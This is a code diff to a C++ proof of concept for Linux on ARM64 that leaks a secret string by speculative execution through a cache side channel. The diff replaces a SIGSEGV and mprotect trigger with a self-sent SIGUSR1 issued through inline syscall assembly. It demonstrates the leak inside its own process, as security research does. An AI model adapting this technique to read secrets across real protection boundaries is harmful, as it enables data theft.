@@ -14,11 +14,6 @@
  * limitations under the License.
  */
 
-#include <array>
-#include <cstring>
-#include <fstream>
-#include <iostream>
-
 #ifndef __linux__
 #  error Unsupported OS. Linux required.
 #endif
@@ -27,10 +22,18 @@
 #  error Unsupported architecture. ARM64 required.
 #endif
 
-#include <linux/membarrier.h>
+#include <algorithm>
+#include <array>
+#include <cstring>
+#include <fstream>
+#include <iostream>
+#include <string>
+#include <tuple>
+#include <vector>
+
 #include <signal.h>
-#include <sys/mman.h>
-#include <sys/syscall.h>
+#include <syscall.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 #include "cache_sidechannel.h"
@@ -38,21 +41,23 @@
 
 const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
-constexpr size_t PAGE_SIZE = 4096;
 
 // Local handler necessary for avoiding local/global linking mismatches on ARM.
+// When we use extern char[] declaration for a label defined in assembly, the
+// compiler yields this sequence that fails loading the actual address of the
+// label:
+// adrp x0, :got:label
+// ldr x0, [x0, #:got_lo12:label]
+// On the other hand when we use this local handler, the compiler yield this
+// sequence of instructions:
+// adrp x0, label
+// add x0, x0, :lo12:label
+// and that works correctly because it if an effective equivalent of
+// adr x0, label.
 static void local_handler() {
   asm volatile("b afterspeculation");
 }
 
-// Function occupying a whole page that accesses the oracle.
-__attribute__((aligned(PAGE_SIZE)))
-static void access_the_oracle(const std::array<BigByte, 256> &isolated_oracle,
-                              const char *data, size_t offset) {
-  ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
-}
-
-__attribute__((aligned(PAGE_SIZE)))
 static char leak_byte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
@@ -62,22 +67,18 @@ static char leak_byte(const char *data, size_t offset) {
     sidechannel.FlushOracle();
 
     // Architecturally access the safe offset.
-    access_the_oracle(isolated_oracle, data, safe_offset);
+    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));
 
-    // Block any access to the oracle.
-    mprotect(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE, PROT_NONE);
+    // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
+    // flow to the "afterspeculation" label.
+    asm volatile(
+        "mov x8, %0\n"
+        "mov x0, %1\n"
+        "mov x1, %2\n"
+        "svc #0\n"::"r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1));
 
-    // Sync the changes and wait synchronously for results.
-    msync(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE, MS_SYNC);
-
-    // Make sure that all is synced with a global memory barrier called through
-    // an inlined syscall.
-    syscall(__NR_membarrier, MEMBARRIER_CMD_SHARED);
-
-    // Jumps to architecturally non-readable and non-executable code.
-    // That triggers SIGSEGV. This is speculatively executed before all three
-    // syscalls above.
-    access_the_oracle(isolated_oracle, data, offset);
+    // Unreachable code. Speculatively access the unsafe_offset.
+    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
 
     std::cout << "Dead code. Must not be printed." << std::endl;
 
@@ -87,12 +88,8 @@ static char leak_byte(const char *data, size_t offset) {
       exit(EXIT_FAILURE);
     }
 
-    // SIGSEGV signal handler moves the instruction pointer to this label.
+    // SIGUSR1 signal handler moves the instruction pointer to this label.
     asm volatile("afterspeculation:");
-
-    // Restore read and exec access to the oracle.
-    mprotect(reinterpret_cast<void *>(access_the_oracle), PAGE_SIZE,
-             PROT_READ | PROT_EXEC);
 
     std::pair<bool, char> result =
         sidechannel.RecomputeScores(data[safe_offset]);
@@ -108,9 +105,9 @@ static char leak_byte(const char *data, size_t offset) {
   }
 }
 
-static void sigsegv(
+static void sigusr1(
     int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGSEGV signal handler.
+  // SIGUSR1 signal handler.
   // Moves the instruction pointer to the "afterspeculation" label jumping to
   // the "local_handler" function.
   ucontext_t *ucontext = static_cast<ucontext_t *>(context);
@@ -119,9 +116,9 @@ static void sigsegv(
 
 static void set_signal() {
   struct sigaction act;
-  act.sa_sigaction = sigsegv;
+  act.sa_sigaction = sigusr1;
   act.sa_flags = SA_SIGINFO;
-  sigaction(SIGSEGV, &act, NULL);
+  sigaction(SIGUSR1, &act, NULL);
 }
 
 int main() {
